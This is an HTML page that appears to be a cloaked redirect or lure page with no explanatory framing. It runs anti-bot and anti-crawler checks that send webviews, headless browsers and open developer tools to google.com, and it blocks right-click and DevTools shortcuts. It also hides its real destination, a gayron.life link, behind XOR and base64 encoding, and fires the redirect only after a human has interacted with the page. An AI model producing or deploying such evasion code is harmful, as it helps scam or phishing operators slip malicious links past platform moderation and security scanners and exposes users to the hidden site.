<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>ðŸ“·</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .btn {
      background-color: white;
      color: black;
      border: none;
      border-radius: 9999px;
      padding: 1.5rem 3rem;
      font-size: 2rem;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }
    canvas.ocr-bait {
      display: none;
    }
  </style>
</head>
<body>
  <button class="btn" onclick="go()">ðŸ“·</button>
  <canvas class="ocr-bait" id="ocr"></canvas>

  <script>
    // ðŸ” Anti-bot checks
    (function() {
      const ua = navigator.userAgent.toLowerCase();
      const badAgents = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
      const isWebview = badAgents.some(agent => ua.includes(agent));

      if (
        isWebview ||
        window.top !== window.self ||
        navigator.webdriver ||
        navigator.plugins.length === 0 ||
        !navigator.languages
      ) {
        location.href = "https://google.com";
      }
    })();

    // ðŸ‘ï¸ OCR bait
    (function() {
      const canvas = document.getElementById("ocr");
      const ctx = canvas.getContext("2d");
      canvas.width = 300;
      canvas.height = 80;
      ctx.font = "20px Arial";
      ctx.fillStyle = "black";
      ctx.fillText("https://gayron.life/rehbixee", 10, 50);
    })();

    // ðŸ’» Headless window size detection
    setInterval(() => {
      if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
        location.href = "https://google.com";
      }
    }, 500);

    // â›”ï¸ Block right click + DevTools
    document.addEventListener("contextmenu", e => e.preventDefault());
    document.onkeydown = e => {
      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
    };

    // âœ… User interaction check
    let interacted = false;
    document.addEventListener("mousemove", () => interacted = true);
    document.addEventListener("touchstart", () => interacted = true);
    document.addEventListener("keypress", () => interacted = true);

    // ðŸ§¬ XOR + base64 encrypted redirect
    function xor(str, key) {
      return str.split('').map((c, i) =>
        String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
      ).join('');
    }

    function go() {
      if (!interacted) return;
      setTimeout(() => {
        const encrypted = "NQcTCgBTUAgTFVpGUBYXA0FSWw4TCFkYVg=="; // XOR("https://gayron.life/rehbixee", "gayron") then btoa()
        const decoded = xor(atob(encrypted), "gayron");
        location.href = decoded;
      }, 1500 + Math.random() * 500);
    }
  </script>
</body>
</html>
